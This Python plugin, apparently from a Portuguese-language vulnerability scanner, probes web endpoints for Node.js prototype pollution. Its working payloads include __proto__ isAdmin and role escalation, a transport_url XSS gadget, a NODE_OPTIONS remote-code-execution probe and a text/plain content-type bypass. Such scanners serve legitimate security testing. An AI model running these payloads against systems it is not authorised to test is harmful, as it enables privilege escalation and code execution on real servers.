# plugins/prototype_pollution.py
def run(target, ip, open_ports, banners):
    """
    Scanner Prototype Pollution (Node.js).
    2026 Intel: DOM XSS via transport_url gadget (PortSwigger), Lodash/jQuery/Express
    merge vulns, isAdmin privilege escalation, CVE-2019-7609 (Kibana RCE),
    cookie manipulation, URL manipulation. Ref: Cobalt.io, yinzhicao.org.
    """
    import requests
    import json

    params = ["config", "settings", "options", "data", "body", "params",
              "query", "filter", "search", "user", "profile", "preferences",
              "merge", "extend", "defaults", "payload"]
    pages = ["/", "/api/", "/api/v1/", "/api/v1/users", "/api/v1/settings",
             "/api/v1/config", "/api/v1/merge", "/api/v1/update"]
    vulns = []

    # T1: JSON body pollution — __proto__
    proto_payloads = [
        ({"__proto__": {"isAdmin": True}}, "__PROTO_ISADMIN"),
        ({"__proto__": {"role": "admin"}}, "__PROTO_ROLE"),
        ({"__proto__": {"polluted": "cascavel-test"}}, "__PROTO_CANARY"),
        ({"constructor": {"prototype": {"polluted": "cascavel-test"}}}, "CONSTRUCTOR_PROTO"),
        ({"__proto__": {"transport_url": "data:,alert(1)//"}}, "__PROTO_XSS_GADGET"),
        ({"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/environ"}}, "__PROTO_RCE_PROBE"),
    ]

    for page in pages:
        url = f"http://{target}{page}"

        for payload, method in proto_payloads:
            try:
                resp = requests.post(url, json=payload, timeout=5,
                                     headers={"Content-Type": "application/json"})
                if resp.status_code in [200, 201]:
                    sev = "MEDIO"
                    if "cascavel-test" in resp.text:
                        sev = "CRITICO"
                        desc = "Prototype pollution confirmada — canary refletido!"
                    elif "isAdmin" in method and "admin" in resp.text.lower():
                        sev = "CRITICO"
                        desc = "Privilege escalation via prototype pollution!"
                    elif "XSS_GADGET" in method:
                        sev = "ALTO"
                        desc = "XSS gadget via transport_url (PortSwigger 2026)"
                    elif "RCE_PROBE" in method:
                        sev = "CRITICO"
                        desc = "RCE probe via NODE_OPTIONS injection!"
                    else:
                        desc = f"Possível prototype pollution via {method}"
                        sev = "MEDIO"

                    vulns.append({
                        "tipo": "PROTOTYPE_POLLUTION", "metodo": method,
                        "pagina": page, "severidade": sev,
                        "descricao": desc,
                    })
            except Exception:
                continue

        # T2: GET parameter pollution
        get_payloads = [
            ("__proto__[polluted]=cascavel-test", "GET_PROTO"),
            ("constructor[prototype][polluted]=cascavel-test", "GET_CONSTRUCTOR"),
            ("__proto__.isAdmin=true", "GET_ISADMIN"),
        ]
        for payload, method in get_payloads:
            try:
                resp = requests.get(f"{url}?{payload}", timeout=5)
                if "cascavel-test" in resp.text or resp.status_code != 400:
                    vulns.append({
                        "tipo": "PROTOTYPE_POLLUTION_GET", "metodo": method,
                        "pagina": page, "severidade": "ALTO",
                    })
                    break
            except Exception:
                continue

        # T3: Content-Type variation
        try:
            resp = requests.post(url,
                                 data='{"__proto__":{"polluted":"cascavel-test"}}',
                                 headers={"Content-Type": "text/plain"}, timeout=5)
            if resp.status_code == 200 and "cascavel-test" in resp.text:
                vulns.append({
                    "tipo": "PROTO_VIA_TEXT_PLAIN", "pagina": page,
                    "severidade": "ALTO",
                    "descricao": "Prototype pollution via text/plain Content-Type bypass!"
                })
        except Exception:
            pass

    return {"plugin": "prototype_pollution", "resultados": vulns if vulns else "Nenhuma prototype pollution detectada"}
